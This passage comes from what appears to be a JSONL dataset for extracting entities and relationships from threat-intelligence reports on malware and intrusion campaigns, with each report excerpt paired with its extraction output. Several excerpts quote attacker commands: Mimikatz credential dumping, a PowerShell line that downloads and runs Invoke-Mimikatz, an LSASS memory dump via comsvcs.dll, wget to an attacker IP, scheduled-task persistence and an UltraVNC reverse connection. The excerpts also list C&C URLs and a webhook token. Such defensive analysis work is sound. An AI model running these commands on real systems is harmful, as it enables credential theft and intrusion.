(hxxps://discordapp[.]com/api/webhooks/1068100542682902558/9JUsLnJZLyEkc_bGS85KTa5M1VWZ2J496v6Ruo7oUclFE08osfXNZL_OK5YDGOPYHLFy, in, Spidey Bot)"}
{"instruction": "Inside Exbyte The Exbyte exfiltration tool is written in Go and designed to upload stolen files to the Mega.co.nz cloud storage service. On execution, Exbyte performs a series of checks for indicators that it may be running in a sandboxed environment. This is intended to make it more difficult for security researchers to analyze the malware. To do this, it calls the IsDebuggerPresent and CheckRemoteDebuggerPresent APIs. It then checks for the running processes from the following applications: MegaDumper 1.0 by CodeCracker / SnD Import reconstructor x64dbg x32dbg OLLYDBG WinDbg The Interactive Disassembler Immunity Debugger - [CPU] It then checks for the following anti-virus or sandbox-related files: avghooka.dll avghookx.dll sxin.dll sf2.dll sbiedll.dll snxhk.dll cmdvrt32.dll cmdvrt64.dll wpespy.dll vmcheck.dll pstorec.dll dir_watch.dll api_log.dll dbghelp.dll This routine of checks is quite similar to the routine employed by the BlackByte payload itself, as documented recently by Sophos .", "input": null, "output": "Named Entities: (Exbyte, malware), (Mega.co.nz, Domain), (avghooka.dll, file), (avghookx.dll, file), (sxin.dll, file), (sf2.dll, file), (sbiedll.dll, file), (snxhk.dll, file), (cmdvrt32.dll, file), (cmdvrt64.dll, file), (wpespy.dll, file), (vmcheck.dll, file), (pstorec.dll, file), (dir_watch.dll, file), (api_log.dll, file), (dbghelp.dll, file), (BlackByte, malware)\n\nRelationships: (Exbyte, upload, Mega.co.nz), (Exbyte, check, avghooka.dll), (Exbyte, check, avghookx.dll), (Exbyte, check, sxin.dll), (Exbyte, check, sf2.dll), (Exbyte, check, sbiedll.dll), (Exbyte, check, snxhk.dll), (Exbyte, check, cmdvrt32.dll), (Exbyte, check, cmdvrt64.dll), (Exbyte, check, wpespy.dll), (Exbyte, check, vmcheck.dll), (Exbyte, check, pstorec.dll), (Exbyte, check, dir_watch.dll), (Exbyte, check, api_log.dll), (Exbyte, check, dbghelp.dll), (Exbyte, similar to, BlackByte)"}
{"instruction": "Observed Webworm activity Symantec observed three malware droppers developed by Webworm: 6201c604ac7b6093dc8f6f12a92f40161508af1ddffa171946b876442a66927e (Trochilus dropper) b9a0602661013d973bc978d64b7abb6bed20cf0498d0def3acb164f0d303b646 (Trochilus Dropper) c71e0979336615e67006e20b24baafb19d600db94f93e3bf64181478dfc056a8 (Trochilus Dropper) Analysis of one of the droppers revealed that it drops the following files: [TEMP]\\Logger.exe (28d78e52420906794e4059a603fa9f22d5d6e4479d91e9046a97318c83998679) [TEMP]\\sc.cfg (a618b3041935ec3ece269effba5569b610da212b1aa3968e5645f3e37d478536) [TEMP]\\logexts.dat (a6b9975bfe02432e80c7963147c4011a4f7cdb9baaee4ae8d27aaff7dff79c2b) [TEMP]\\logexts.dll (a73a4c0aa557241a09e137387537e04ce582c989caa10a6644d4391f00a836ef) [TEMP]\\logger.dat (10456bc3b5cfd2f1b1ab9c3833022ef52f5e9733d002ab237bdebad09b125024) [TEMP]\\[RANDOM_DIGITS].doc (d295712185de2e5f8811b0ce7384a04915abdf970ef0f087c294bb00e340afad) The legitimate executable Logger.exe is used to call the \u201cLoadLibraryA\u201d API in order to load the malicious \"[TEMP]\\logexts.dll\" file. The logexts.dll file is a loader. Once run, it checks the process command-line parameters. If the command-line is the single parameter \"isdf\", it attempts to steal a token from the \"WINLOGON.EXE\" process. It then starts the following process by calling the CreateProcessAsUserW API: C:\\ProgramData\\Logger\\Logger.exe mdkv Otherwise it constructs the pathname of the second stage based on its own running executable, where it replaces the last three characters with hardcoded \"dat\" (resulting with \"Logger.dat\"). Then it reads and executes the second stage as shellcode.", "input": null, "output": "Named Entities: (Webworm, attacker), (Trochilus dropper, malware), (6201c604ac7b6093dc8f6f12a92f40161508af1ddffa171946b876442a66927e, SHA256), (Trochilus Dropper, malware), (b9a0602661013d973bc978d64b7abb6bed20cf0498d0def3acb164f0d303b646, SHA256), (Trochilus Dropper, malware), (c71e0979336615e67006e20b24baafb19d600db94f93e3bf64181478dfc056a8, SHA256), ([TEMP]\\Logger.exe, file), (28d78e52420906794e4059a603fa9f22d5d6e4479d91e9046a97318c83998679, SHA256), ([TEMP]\\sc.cfg, file), (a618b3041935ec3ece269effba5569b610da212b1aa3968e5645f3e37d478536, SHA256), ([TEMP]\\logexts.dat, file), (a6b9975bfe02432e80c7963147c4011a4f7cdb9baaee4ae8d27aaff7dff79c2b, SHA256), ([TEMP]\\logexts.dll, file), (a73a4c0aa557241a09e137387537e04ce582c989caa10a6644d4391f00a836ef, SHA256), ([TEMP]\\logger.dat, file), (10456bc3b5cfd2f1b1ab9c3833022ef52f5e9733d002ab237bdebad09b125024, SHA256), ([TEMP]\\[RANDOM_DIGITS].doc, file), (d295712185de2e5f8811b0ce7384a04915abdf970ef0f087c294bb00e340afad, SHA256), ([TEMP]\\logexts.dll, file), (logexts.dll, file), (Logger.dat, file)\nRelationships: (Webworm, develop, Trochilus dropper), (Trochilus dropper, hash, 6201c604ac7b6093dc8f6f12a92f40161508af1ddffa171946b876442a66927e), (Trochilus Dropper, hash, b9a0602661013d973bc978d64b7abb6bed20cf0498d0def3acb164f0d303b646), (Trochilus Dropper, hash, c71e0979336615e67006e20b24baafb19d600db94f93e3bf64181478dfc056a8), (Trochilus dropper, drop, [TEMP]\\Logger.exe), ([TEMP]\\Logger.exe, hash, 28d78e52420906794e4059a603fa9f22d5d6e4479d91e9046a97318c83998679), (Trochilus dropper, drop, [TEMP]\\sc.cfg), ([TEMP]\\sc.cfg, hash, a618b3041935ec3ece269effba5569b610da212b1aa3968e5645f3e37d478536), (Trochilus dropper, drop, [TEMP]\\logexts.dat), ([TEMP]\\logexts.dat, hash, a6b9975bfe02432e80c7963147c4011a4f7cdb9baaee4ae8d27aaff7dff79c2b), (Trochilus dropper, drop, [TEMP]\\logexts.dll), ([TEMP]\\logexts.dll, hash, a73a4c0aa557241a09e137387537e04ce582c989caa10a6644d4391f00a836ef), (Trochilus dropper, drop, [TEMP]\\logger.dat), ([TEMP]\\logger.dat, hash, 10456bc3b5cfd2f1b1ab9c3833022ef52f5e9733d002ab237bdebad09b125024), (Trochilus dropper, drop, [TEMP]\\[RANDOM_DIGITS].doc), ([TEMP]\\[RANDOM_DIGITS].doc, hash, d295712185de2e5f8811b0ce7384a04915abdf970ef0f087c294bb00e340afad),  (LoadLibraryA, load, [TEMP]\\logexts.dll), ([TEMP]\\logexts.dll, loader, logexts.dll), (logexts.dll, check, WINLOGON.EXE), (logexts.dll, start, C:\\ProgramData\\Logger\\Logger.exe), (logexts.dll, construct, Logger.dat)"}
{"instruction": "calc.exe \"\"privilege::debug\"\" \"\"sekurlsa::logonpasswords full\" \" exit \" On April 26, further malicious activity occurred when the attackers ran the Crash Handler executable and installed a file called cal.exe (SHA256: 12534f7014b3338d8f9f86ff1bbeacf8c80ad03f1d0d19077ff0e406c58b5133) on the compromised machine. This file was LadonGo v3.8, a publicly available penetration testing framework that is written in Go. The attackers appear to have used LadonGo to scan the internal network for machines with RDP services running and attempted to exploit or log in to those machines using the credentials they stole several days earlier. There was also some evidence of brute-force login attempts against machines of interest.", "input": null, "output": "Named Entities: (calc.exe, file), (cal.exe, file), (12534f7014b3338d8f9f86ff1bbeacf8c80ad03f1d0d19077ff0e406c58b5133, SHA256), (LadonGo v3.8, tool), (Go, tool)\nRelationships: (attackers, installed, cal.exe), (cal.exe, hash, 12534f7014b3338d8f9f86ff1bbeacf8c80ad03f1d0d19077ff0e406c58b5133), (cal.exe, tool, LadonGo v3.8), (LadonGo v3.8, written in, Go), (attackers, used, LadonGo)"}
{"instruction": "On May 6, the attackers resumed their attack and ran the Crash Handler executable (this time named svchost.exe) and installed a new variant of Mimikatz named test.exe (SHA256: 912018ab3c6b16b39ee84f17745ff0c80a33cee241013ec35d0281e40c0658d9). This was likely done in order to obtain more credentials. The attackers then ran LadonGo and attempted to exploit a Netlogon vulnerability ( CVE-2020-1472 ) against two other computers in the organization in order to elevate privileges. On May 16, the attackers increased their level of activity and began moving laterally across the organization\u2019s network from the initially compromised computer (Computer #1). On a second computer (Computer #2), the attackers launched a command prompt and executed a variant of Mimikatz (file name: test.exe, SHA256: 912018ab3c6b16b39ee84f17745ff0c80a33cee241013ec35d0281e40c0658d9). The attackers then deployed a number of Knowledge Base files (e.g. kb0394623.exe) on the computer. These files are legitimate copies of the Windows command prompt (with 16 bytes of the rich header modified).", "input": null, "output": "Named Entities: (Crash Handler, tool), (svchost.exe, file), (Mimikatz, malware), (test.exe, file), (SHA256: 912018ab3c6b16b39ee84f17745ff0c80a33cee241013ec35d0281e40c0658d9, SHA256), (LadonGo, tool), (CVE-2020-1472, vulnerability), (kb0394623.exe, file)\n\nRelationships: (Crash Handler, named, svchost.exe), (svchost.exe, install, Mimikatz), (Mimikatz, name, test.exe), (test.exe, hash, 912018ab3c6b16b39ee84f17745ff0c80a33cee241013ec35d0281e40c0658d9), (attackers, run, LadonGo), (LadonGo, exploit, CVE-2020-1472), (attackers, deploye, kb0394623.exe)"}
{"instruction": "On a third computer (Computer #3) the attackers used PsExec to execute the same older version of Crash Handler used on Computer #1, this time named javac.exe. A copy of this executable was then made to csidl_program_files\\windows mail\\winmailservice.exe and was executed. The attackers then ran dnscmd.exe (SHA256: 67877821bf1574060f4e45ab8be62e28f54fb40a23ce70b86a6369a4d63db5bc), which was used to enumerate DNS configuration information on the compromised computer: Dnscmd . /EnumZones Dnscmd is a Microsoft command-line tool for managing DNS servers. It can be used to script batch files to help automate routine DNS management tasks or to perform routine setup of new DNS servers. The enumzones command is used to list the zones that exist on the specified DNS server. If no filters are specified, a complete list of zones is returned.", "input": null, "output": "Named Entities: (PsExec, tool), (Crash Handler, file), (javac.exe, file), (csidl_program_files\\windows mail\\winmailservice.exe, file), (dnscmd.exe, tool), (67877821bf1574060f4e45ab8be62e28f54fb40a23ce70b86a6369a4d63db5bc, SHA256)\nRelationships: (PsExec, execute, Crash Handler), (Crash Handler, name, javac.exe), (javac.exe, copy to, csidl_program_files\\windows mail\\winmailservice.exe), (attackers, run, dnscmd.exe), (dnscmd.exe, hash, 67877821bf1574060f4e45ab8be62e28f54fb40a23ce70b86a6369a4d63db5bc)"}
{"instruction": "Crash Handler was then used to install imjpuex.exe in the csidl_common_appdata\\veritas directory which in turn was used to side-load a DLL file of the same name and load a .dat file to execute an unknown custom payload. Shortly after this, the attackers attempted to list the records of multiple specific zones by specifying the domain on the command line: Dnscmd . /ZonePrint [REDACTED_DOMAIN] On a fourth computer (Computer #4), the attackers used PsExec to execute Crash Handler (this time named test.exe). They then installed and executed two KB files in the %TEMP% directory. \u2022 SHA256: 5c4456f061ff764509a2b249f579a5a14d475c6714f714c5a45fdd67921b9fda \u2022 SHA256: ded734f79058c36a6050d801e1fb52cd5ca203f3fd6af6ddea52244132bd1b51 Again, both of these files were modified versions of the Windows command prompt. On May 17, the attackers deployed several more modified Windows command prompt applications on Computer #4. They also deployed the side-loading technique on Computer #5 to execute the legitimate svchost.exe application, possibly to facilitate some process injection.", "input": null, "output": "Named Entities: (Crash Handler, tool), (imjpuex.exe, file), (PsExec, tool), (test.exe, file), (5c4456f061ff764509a2b249f579a5a14d475c6714f714c5a45fdd67921b9fda, SHA256), (ded734f79058c36a6050d801e1fb52cd5ca203f3fd6af6ddea52244132bd1b51, SHA256), (svchost.exe, file)\nRelationships: (Crash Handler, install, imjpuex.exe), (Crash Handler,named, test.exe), (Crash Handler, execute, 5c4456f061ff764509a2b249f579a5a14d475c6714f714c5a45fdd67921b9fda), (Crash Handler, execute, ded734f79058c36a6050d801e1fb52cd5ca203f3fd6af6ddea52244132bd1b51), (attacker, execute, svchost.exe)"}
{"instruction": "Mimikatz is a go-to tool for most ransomware groups and Hive, Conti, and Avoslocker are no exception. We have observed them using the PowerShell version of Mimikatz as well as the PE version of the tool. There are also instances where the threat actors directly load the PowerShell version of Mimikatz from GitHub repositories: powershell IEX((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/<redacted>/Invoke-Mimikatz.ps1'));Invoke-Mimikatz -DumpCreds In addition to using Mimikatz, the threat actors have also taken advantage of the native rundll32 and comsvcs.dll combination to dump the LSASS memory: rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <process id> lsass.dmp full Adversaries also dump the SECURITY, SYSTEM, and SAM hives and later extract credentials from the dump. In rare occasions they have also been observed using taskmgr.exe to dump the LSASS memory and later using the dump to extract valuable credentials. Lateral Movement", "input": null, "output": "Named Entities: (Mimikatz, tool), (Hive, tool), (Conti, tool), (Avoslocker, tool), (https://raw.githubusercontent.com/<redacted>/Invoke-Mimikatz.ps1, URL), (comsvcs.dll, file), (rundll32.exe, file), (taskmgr.exe, file)\n\nRelationships: (Mimikatz, download from, https://raw.githubusercontent.com/<redacted>/Invoke-Mimikatz.ps1), (threat actor, use, comsvcs.dll), (comsvcs.dll, dump LSASS memory, rundll32.exe), (threat actor, use, taskmgr.exe)"}
{"instruction": "\"ct\" has value \"0\" \"bv\" has value \"v1.0.0\" The server has been observed to respond as follows: HTTP/1.1 200 OK Date: Fri, 28 Jan 2022 21:29:26 GMT Content-Type: text/html; charset=UTF-8 Transfer-Encoding: chunked Connection: keep-alive CF-Cache-Status: DYNAMIC Expect-CT: max-age=604800, report-uri=\"hxxps://report-uri[.]cloudflare.com/cdn-cgi/beacon/expect-ct\" Report-To: {\"endpoints\":[{\"url\":\"hxxps:\\/\\/a.nel.cloudflare[.]com\\/report\\/v3?s=JE2u6s575flQq%2BEumTamotRln2IsYdLgqtQHy0tGJwQp9tuxhWThqxtCzsMG6vVgc%2Fa76jGYsP8hb68S3hKu8Q5lm6H2iIYElyVHw4WOcGSLqi%2FLR6AX5RcYlsXd\"}],\"group\":\"cf-nel\",\"max_age\":604800} NEL: {\"success_fraction\":0,\"report_to\":\"cf-nel\",\"max_age\":604800} Server: cloudflare CF-RAY: 6d4d50f69c993a8d-CDG alt-svc: h3=\":443\"; ma=86400, h3-29=\":443\"; ma=86400 98 Rc0OiT8tzq68CmJ7bi0SMLtCQQH8bjxlid0OONwvn+x9g2ku8Ocfx+lT+TZXBzLC9/K7hJ/efOYWz9e1HC3KrRkQoh3OTZezXIOhJ6gTRPiLeqDgCGT79FcFqm7SFEDPHl1NpR14dl/6R92VwKZE/A== 0 Where the response body can be decrypted as follows: newtask:1:Mw==:YUhSMGNITTZMeTlxYjI1aGRHaGhibWhoY21SM2FXTnJMbTFsTDJoaGNtUjNhV05yTG1waGNuNXpkR0Z5ZEE9PQ== The last term above contains the following string: hxxps://jonathanhardwick[.]me/hardwick.jar~start Some samples of the malware are seen communicating with the following servers: gaymers[.]ax 6f3af6ffb074513b51bba688a0b41df7[.]tk Communication between the malware and servers is over HTTP or HTTPS and this communication appears to culminate with victims being directed to connect to the following: POST /mafia/login.php HTTP/1.1 User-Agent: VerbleConnectTM Content-Type: application/x-www-form-urlencoded charset: utf-8 Cache-Control: no-cache Pragma: no-cache Host: gaymers.ax Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2 Connection: keep-alive Content-Length: 291 id=il~aSS_3ZNaXHMGXLExSyzp6xMrxMB7zCw1zFndLA87jjqd0tPsFqY31LF65YGEt&os=5i1E5v8J8fUqwpvNWkN6QQ&pv=6qWqTXHlWudJmSz_fuWcBA&ip=VfseCVZvINz5rCbXun59p", "input": null, "output": "Named Entities: (gaymers[.]ax, Domain), (6f3af6ffb074513b51bba688a0b41df7[.]tk, Domain), (hxxps://jonathanhardwick[.]me/hardwick.jar~start, URL)\nRelationships: No related entities and relations."}
{"instruction": "[+] iss = \"https://myvaccinerecord.cdph.ca.gov/creds\" [+] nbf = 1635982044 ==> TIMESTAMP = 2021-11-03 16:27:24 (UTC) [+] vc = JSON object: [+] type = \"['https://smarthealth.cards#health-card', 'https://smarthealth.cards#immunization', 'https://smarthealth.cards#covid19']\" [+] credentialSubject = {\"fhirVersion\": \"4.0.1\", \"fhirBundle\": {\"resourceType\": \"Bundle\", \"type\": \"collection\", \"entry\": [{\"fullUrl\": \"resource:0\", \"resource\": {\"resourceType\": \"Patient\", \"name\": [{\"family\": \"Doe\", \"given\": [\"John\"]}], \"birthDate\": \"1980-01-01\"}}, {\"fullUrl\": \"resource:1\", \"resource\": {\"resourceType\": \"Immunization\", \"status\": \"completed\", \"vaccineCode\": {\"coding\": [{\"system\": \"http://hl7.org/fhir/sid/cvx\", \"code\": \"208\"}]}, \"patient\": {\"reference\": \"resource:0\"}, \"occurrenceDateTime\": \"2021-03-01\", \"lotNumber\": \"EN6208\"}}, {\"fullUrl\": \"resource:2\", \"resource\": {\"resourceType\": \"Immunization\", \"status\": \"completed\", \"vaccineCode\": {\"coding\": [{\"system\": \"http://hl7.org/fhir/sid/cvx\", \"code\": \"208\"}]}, \"patient\": {\"reference\": \"resource:0\"}, \"occurrenceDateTime\": \"2021-04-01\", \"lotNumber\": \"ER8737\"}}]}}}} Token signature: YCeST7-YDMawwowswFx1R_TYg_5mDVsrSXqNLckdqCY5eNriEoUaSBSu7sCF8T", "input": null, "output": "Named Entities: (https://myvaccinerecord.cdph.ca.gov/creds, URL), (https://smarthealth.cards#health-card, URL), (https://smarthealth.cards#immunization, URL), (https://smarthealth.cards#covid19, URL)\nRelationships: No related entities and relations."}
{"instruction": "Attack chain for recent activity We did not observe what the initial infection vector was in this campaign, but it was likely a malicious URL spread via either spam email campaigns or through malvertising, which is typically the first step in Latin American banking Trojan campaigns. Victims are then directed to one of the following malicious URLs: hxxps://centreldaconsulta[.]com/ hxxps://www.centralcfconsulta[.]net/ hxxps://centralcfconsulta[.]net/index3.php?api=vFUMIfUzGz2QdjxTFKAMyTlh hxxps://centralcfconsulta.net/ hxxps://www.centralcfconsulta[.]net/index3.php?api=r0ubnHRxDycEy5uFPViNA55Y3t hxxps://www.centralcfconsulta[.]net/index3.php?api=4DQSbdp3hLqPRGTbOGtl7jCD9FKNViKXmKd9Lv hxxps://centreldaconsulta[.]com/index3.php?api=nJsdr1J3h0fsG18sRAVQt6JjVW hxxps://centreldaconsulta[.]com/index3.php?api=ThMyMCAQEOLIC9nO hxxps://www.centralcfconsulta[.]net/index3.php?api=wen1eIFCeUh0jAS3mWIDUhSLt3sXMQ Victims are then redirected to an Amazon Web Services (AWS) URL, which it appears the attackers abused to use as a command-and-control (C&C) server. A ZIP file that contains a Microsoft Software Installer (MSI) file is downloaded from the AWS infrastructure. ESET reported that most gangs deploying banking Trojans in Latin America had started using MSI files as an initial download in 2019. An MSI file can be used to install, uninstall, and update applications running on Windows systems.", "input": null, "output": "Named Entities: (Latin American banking Trojan, malware), (hxxps://centreldaconsulta[.]com/, URL), (hxxps://www.centralcfconsulta[.]net/, URL), (hxxps://centralcfconsulta[.]net/index3.php?api=vFUMIfUzGz2QdjxTFKAMyTlh, URL), (hxxps://centralcfconsulta.net/, URL), (hxxps://www.centralcfconsulta[.]net/index3.php?api=r0ubnHRxDycEy5uFPViNA55Y3t, URL), (hxxps://www.centralcfconsulta[.]net/index3.php?api=4DQSbdp3hLqPRGTbOGtl7jCD9FKNViKXmKd9Lv, URL), (hxxps://centreldaconsulta[.]com/index3.php?api=nJsdr1J3h0fsG18sRAVQt6JjVW, URL), (hxxps://centreldaconsulta[.]com/index3.php?api=ThMyMCAQEOLIC9nO, URL), (hxxps://www.centralcfconsulta[.]net/index3.php?api=wen1eIFCeUh0jAS3mWIDUhSLt3sXMQ, URL), (ESET, tool)\nRelationships: (Latin American banking Trojan, directed to, hxxps://centreldaconsulta[.]com/), (Latin American banking Trojan, directed to, hxxps://www.centralcfconsulta[.]net/), (Latin American banking Trojan, directed to, hxxps://centralcfconsulta[.]net/index3.php?api=vFUMIfUzGz2QdjxTFKAMyTlh), (Latin American banking Trojan, directed to, hxxps://centralcfconsulta.net/), (Latin American banking Trojan, directed to, hxxps://www.centralcfconsulta[.]net/index3.php?api=r0ubnHRxDycEy5uFPViNA55Y3t), (Latin American banking Trojan, directed to,hxxps://www.centralcfconsulta[.]net/index3.php?api=4DQSbdp3hLqPRGTbOGtl7jCD9FKNViKXmKd9Lv), (Latin American banking Trojan, directed to, hxxps://centreldaconsulta[.]com/index3.php?api=nJsdr1J3h0fsG18sRAVQt6JjVW), (Latin American banking Trojan, directed to, hxxps://centreldaconsulta[.]com/index3.php?api=ThMyMCAQEOLIC9nO), (Latin American banking Trojan, directed to, hxxps://www.centralcfconsulta[.]net/index3.php?api=wen1eIFCeUh0jAS3mWIDUhSLt3sXMQ)"}
{"instruction": "SCHTASKS /CREATE /sc minute /mo 12 /tn \\\"deep-versed\\\" /tr \\\"wscript.exe \\\"[%PUBLIC%]\\\\Pictures\\\\deep-versed.nls\\\" //e:VBScript //b\\\" /F The dropped file deep-versed.nls (817901df616c77dd1e5694e3d75aebb3a52464c23a06820517108c74edd07fbc) downloads a payload from a C&C server (deep-toned.chehalo.ru) and saves it as deep-green.exe in the following location: %PUBLIC%\\Downloads deep-green.exe The file deep-green.exe (1ddc9b873fe4f4c8cf8978b6b1bb0e4d9dc07e60ba188ac6a5ad8f162d2a1e8f) contains an UltraVNC binary, which upon execution connects to a repeater (mucoris.ru:5612) using the following command line: -autoreconnect -id:%RANDOM% -connect mucoris.ru:5612 UltraVNC is an open-source remote-administration/remote-desktop-software utility. deep-green.exe A second file named deep-green.exe (f6c56a51c1f0139036e80a517a6634d4d87d05cce17c4ca5adc1055b42bf03aa) contain a Process Explorer (procexp) binary. Process Explorer is a freeware task manager and system monitor for Microsoft Windows. deep-green.exe A third file called deep-green.exe (de5a53a3b75e3e730755af09e3cacb7e6d171fc9b1853a7200e5dfb9044ab20a) is similar to descend.exe (0d4b8e244f19a009cee50252f81da4a2f481da9ddb9b204ef61448d56340c137) just with different file names and C&C server (deer-lick.chehalo.ru). deep-green.exe The fourth and final file named deep-green.exe (d15a7e69769f4727f7b522995a17a0206ac9450cfb0dfe1fc98fd32272ee5ba7) drops a VBS file in the following location: %PUBLIC%\\Music\\ It then creates the following task:", "input": null, "output": "Named Entities: (SCHTASKS, tool), (deep-versed.nls, file), (817901df616c77dd1e5694e3d75aebb3a52464c23a06820517108c74edd07fbc, SHA256), (deep-green.exe, file), (1ddc9b873fe4f4c8cf8978b6b1bb0e4d9dc07e60ba188ac6a5ad8f162d2a1e8f, SHA256), (UltraVNC, tool), (f6c56a51c1f0139036e80a517a6634d4d87d05cce17c4ca5adc1055b42bf03aa, SHA256), (procexp, tool), (de5a53a3b75e3e730755af09e3cacb7e6d171fc9b1853a7200e5dfb9044ab20a, SHA256), (d15a7e69769f4727f7b522995a17a0206ac9450cfb0dfe1fc98fd32272ee5ba7, SHA256)\nRelationships: (SCHTASKS, create, deep-versed.nls), (deep-versed.nls, hash, 817901df616c77dd1e5694e3d75aebb3a52464c23a06820517108c74edd07fbc), (deep-versed.nls, save as, deep-green.exe), (deep-green.exe, hash, 1ddc9b873fe4f4c8cf8978b6b1bb0e4d9dc07e60ba188ac6a5ad8f162d2a1e8f), (deep-green.exe, tool, UltraVNC), (deep-green.exe, hash, f6c56a51c1f0139036e80a517a6634d4d87d05cce17c4ca5adc1055b42bf03aa), (deep-green.exe, tool, procexp), (deep-green.exe, hash, de5a53a3b75e3e730755af09e3cacb7e6d171fc9b1853a7200e5dfb9044ab20a), (deep-green.exe, hash, d15a7e69769f4727f7b522995a17a0206ac9450cfb0dfe1fc98fd32272ee5ba7)"}
{"instruction": "Custom Downloader - uses Microsoft infrastructure for its C&C activity Custom Screenshotter - periodically logs screenshots to a file Cobalt Strike Beacon - uses CloudFront infrastructure for its C&C activity (Cobalt Strike is an off-the-shelf tool that can be used to execute commands, inject other processes, elevate current processes, or impersonate other processes, and upload and download files) Metasploit - an off-the-shelf modular framework that can be used for a variety of malicious purposes on victim machines, including privilege escalation, screen capture, to set up a persistent backdoor, and more. The custom downloader used by the attackers leverages the Costura Assembly Loader. Once on a victim machine, it checks if the following file exists: [ARTEFACTS_FOLDER]\\winser.dll If the file does not exist it downloads a copy from the following URL: hxxps://outportal[.]azurewebsites.net/api/Values_V2/Getting3210 Next, the sample creates the following file if it does not exist: \"[ARTEFACTS_FOLDER]\\Microsoft Services[.]vbs\"", "input": null, "output": "Named Entities: (Custom Downloader, tool), (Custom Screenshotter, tool), (Cobalt Strike Beacon, tool), (Metasploit, tool), (Costura Assembly Loader, tool), ([ARTEFACTS_FOLDER]\\winser.dll, file), (hxxps://outportal[.]azurewebsites.net/api/Values_V2/Getting3210, URL)\nRelationships: (Custom Downloader, leverage, Costura Assembly Loader), (Custom Downloader, download, hxxps://outportal[.]azurewebsites.net/api/Values_V2/Getting3210), (Custom Downloader, check, [ARTEFACTS_FOLDER]\\winser.dll)"}
{"instruction": "Then it sets the following registry value to create a loadpoint: HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\\"MicrosoftSystemServices\" = \"[ARTEFACTS_FOLDER]\\Microsoft Services[.]vbs\" Finally it opens an embedded web browser within its own UI using the following URL: hxxps://usedust[.]com While it initially appeared that this URL may have been a loadpoint for Backdoor.Graphon, upon further investigation it appears to be a decoy to confuse any affected users. Backdoor.Graphon is compiled as a .NET PE DLL with export \u201cMain\u201d and the following PDB file name: D:\\OfficeProjects\\Updated Working Due to Submission\\4.5\\Outlook_4.5\\Outlook 4.5.2 32 bit New without presistancy\\NPServices\\bin\\x86\\Debug\\NPServices[.]pdb When this is executed, it attempts to communicate with the attackers\u2019 C&C servers, which are hosted on Microsoft infrastructure. hxxps://microsoftmsdn[.]azurewebsites.net/api/Values_V1/AuthAsyncComplete_V1?Identity=[INFECTION_ID] hxxps://microsoftsgraphapi[.]azurewebsites.net/api/Values_V1/AuthAsyncComplete_V1?Identity=[INFECTION_ID] hxxps://msdnmicrosoft.azurewebsites[.]net/api/Values_V1/AuthAsyncComplete_V1?Identity=[INFECTION_ID] The attackers then run commands to control their input stream and capture the output and error streams. They also periodically send GET requests to the C&C server, with the content of any returned messages extracted and then deleted.", "input": null, "output": "Named Entities: (Backdoor.Graphon, malware), (MicrosoftSystemServices, tool), (hxxps://usedust[.]com, URL), (hxxps://microsoftmsdn[.]azurewebsites.net/api/Values_V1/AuthAsyncComplete_V1?Identity=[INFECTION_ID], URL), (hxxps://microsoftsgraphapi[.]azurewebsites.net/api/Values_V1/AuthAsyncComplete_V1?Identity=[INFECTION_ID], URL), (hxxps://msdnmicrosoft.azurewebsites[.]net/api/Values_V1/AuthAsyncComplete_V1?Identity=[INFECTION_ID], URL), (Microsoft infrastructure, tool)\nRelationships: (Backdoor.Graphon, loadpoint, MicrosoftSystemServices), (Backdoor.Graphon, decoy, hxxps://usedust[.]com), (Backdoor.Graphon, communicate with, Microsoft infrastructure), (MicrosoftSystemServices, URL, hxxps://usedust[.]com), (Backdoor.Graphon, communicate with, hxxps://microsoftmsdn[.]azurewebsites.net/api/Values_V1/AuthAsyncComplete_V1?Identity=[INFECTION_ID]), (Backdoor.Graphon, communicate with, hxxps://microsoftsgraphapi[.]azurewebsites.net/api/Values_V1/AuthAsyncComplete_V1?Identity=[INFECTION_ID]), (Backdoor.Graphon, communicate with, hxxps://msdnmicrosoft.azurewebsites[.]net/api/Values_V1/AuthAsyncComplete_V1?Identity=[INFECTION_ID])"}
{"instruction": "Attack chain Exchange servers are compromised through an as yet unidentified technique. On exploitation, the attacker executes a PowerShell command such as the following: powershell wget hxxp://209.14.0[.]234:46613/VcEtrKighyIFS5foGNXH Other powershell wget commands to the same IP address use similar seemingly random high port numbers. It is unknown exactly what is downloaded by the PowerShell command; however, the attackers maintain access on victim networks for at least several days before beginning the ransomware attack. Typically around 20 to 30 minutes prior to deploying ransomware, the attackers install a set of tools onto the compromised Exchange Server. Included in these tools is: An exploit for the CVE-2021-36942 vulnerability (aka PetitPotam). The code appears to be copied from https://github.com/zcgonvh/EfsPotato . This is in a file called \u201cefspotato.exe\u201d. Two files: active_desktop_render.dll and active_desktop_launcher.exe", "input": null, "output": "Named Entities: (powershell, tool), (hxxp://209.14.0[.]234:46613/VcEtrKighyIFS5foGNXH, URL), (CVE-2021-36942, vulnerability), (https://github.com/zcgonvh/EfsPotato, URL),  (efspotato.exe, file), (active_desktop_render.dll, file), (active_desktop_launcher.exe, file)\nRelationships: (attacker, execute, powershell), (powershell, wget, hxxp://209.14.0[.]234:46613/VcEtrKighyIFS5foGNXH), (attacker, exploit, CVE-2021-36942), (attacker, copy from, https://github.com/zcgonvh/EfsPotato), (https://github.com/zcgonvh/EfsPotato, copy, efspotato.exe), (efspotato.exe, has, active_desktop_render.dll), (efspotato.exe, has, active_desktop_launcher.exe)"}
{"instruction": "STOLEN CODE Byte-copy of machine code from pre-existing third-party components. The original code is distributed in compiled format only. Recompiled third-party source code. While both malware families are designed to deploy Cobalt Strike Beacon, there are differences in Cobalt Strike configuration. To date, Symantec has seen four samples of Raindrop. In three cases, Cobalt Strike was configured to use HTTPS as a communication protocol. In the fourth it was configured to use SMB Named Pipe as a communication protocol. All three Raindrop samples using HTTPS communication follow very similar configuration patterns as previously seen in one Teardrop sample (b820e8a2057112d0ed73bd7995201dbed79a79e13c79d4bdad81a22f12387e07). The most important similarities are highlighted below. TEARDROP SHA256 b820e8a2057112d0ed73bd7995201dbed79a79e13c79d4bdad81a22f12387e07 URLs https(://)infinitysoftwares(.)com/files/information_055.pdf https(://)infinitysoftwares(.)com/wp-admin/new_file.php POST FORM name=\"uploaded_1\";filename=\"33139.pdf\" Content-Type: text/plain RAINDROP SHA256 be9dbbec6937dfe0a652c0603d4972ba354e83c06b8397d6555fd1847da36725 URLs https(://)bigtopweb(.)com/files/page_306.pdf https(://)bigtopweb(.)com/wp-admin/admin-ajax.php POST FORM 